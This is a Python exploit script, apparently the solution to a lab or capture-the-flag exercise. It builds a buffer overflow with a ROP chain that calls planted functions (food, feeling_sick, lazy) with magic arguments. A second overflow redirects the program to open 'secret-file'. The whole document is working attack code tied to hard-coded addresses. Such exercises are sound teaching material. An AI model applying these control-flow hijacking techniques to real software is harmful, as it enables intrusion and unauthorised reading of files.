#!/usr/bin/env python3
import sys

#Overflow buf with argv[2] to change the filename in main
#Overflow buffer with argv[1] to change the flow of execution in vuln as follow:
#	Call food() with magic=0xdeadbeef
#	Call feeling_sick() with magic1=0xd15ea5e, magic2=0x0badf00d,filename=*filename
#	Call lazy


def get_vuln_overflow_payload():
	buff_len = 0x64
	PAYLOAD = b'A'*buff_len+\
		b'_EBX'+\
		b'_EDI'+\
		b'EBP0'
	return PAYLOAD


def get_payloads():
	food_addr = 0x080491db.to_bytes(4,'little')
	magic = 0xdeadbeef.to_bytes(4,'little')
	feeling_sick_addr = 0x0804921c.to_bytes(4,'little')
	magic1 = 0xd15ea5e.to_bytes(4,'little')
	magic2 = 0xbadf00d.to_bytes(4,'little')
	filename_addr = 0xffffd39b.to_bytes(4,'little')
	pop1 = 0x08049022.to_bytes(4,'little')
	lazy_addr = 0x080491b6.to_bytes(4,'little')
	
	PAYLOAD1 = get_vuln_overflow_payload()+\
		food_addr+\
		pop1+\
		magic+\
		feeling_sick_addr+\
		lazy_addr+\
		magic1+\
		magic2+\
		filename_addr

	PAYLOAD2 = b'AA'+b'secret-file'*12
	
	return (PAYLOAD1,PAYLOAD2)

def output(mode,payload1,payload2):
	if mode == 'inline':
		sys.stdout.buffer.write(payload1 + b' ' + payload2)
	elif mode == 'file':
		with open('input_rop-vuln.txt','wb') as f:
			f.write(payload1 + b' ' + payload2)
	else:
		sys.stdout.buffer.write(payload1 + b' ' + payload2)
		with open('input_rop-vuln.txt','wb') as f:
                        f.write(payload1 + b' ' + payload2)

def main(mode):
	new_filename = b'secret-file\n'
	PAYLOAD = get_payloads()
	PAYLOAD_2 = b'A'*50+b'BBBBBBBB'
	
	output(mode,PAYLOAD[0],PAYLOAD[1])
	return


if __name__ == '__main__':
	if len(sys.argv) < 2:
		exit(-1)
	else:
		main(sys.argv[1])
